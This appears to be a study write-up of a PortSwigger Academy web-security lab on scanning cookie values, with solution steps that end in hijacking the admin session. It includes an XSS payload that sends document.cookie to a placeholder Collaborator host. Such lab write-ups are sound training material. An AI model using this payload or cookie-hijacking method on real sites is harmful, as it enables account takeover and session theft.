# Lab: Scanning non-standard data structures

**Official PortSwigger URL:** [https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures)

**Lab idea:** This challenge practices testing an input embedded in a non-standard data structure that may be difficult to spot manually. It focuses on selecting a particular insertion point for scanning, interpreting the resulting vulnerability finding, and understanding that scanner output must be followed by manual validation and assessment.

## Vulnerability in brief
**Essential skills** is a general web-security learning and testing category, not a vulnerability class. It covers transferable methods for applying Academy knowledge to less predictable targets, making efficient use of Burp features during manual testing, and learning to recognize vulnerabilities without being told in advance which class to seek. The Academy also emphasizes that labs demonstrate only particular variations of bugs; real testing requires adapting to differences in how applications process input.

## Solution idea
1. Log in to your account with the provided credentials.
2. In Burp, go to the Proxy > HTTP history tab.
3. Find the GET /my-account?id=wiener request, which contains your new authenticated session cookie.
4. Study the session cookie and notice that it contains your username in cleartext, followed by a token of some kind.
- …
6. Go to the Application tab and select Cookies .
7. Replace your session cookie with the admin user's session cookie, and refresh the page.
8. Access the admin panel and delete carlos to solve the lab.

## Payloads / key values
- `GET /my-account?id=wiener`
- `wiener`
- ``'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID``
- `carlos`

## Official source
- [PortSwigger Academy: Lab: Scanning non-standard data structures](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures)
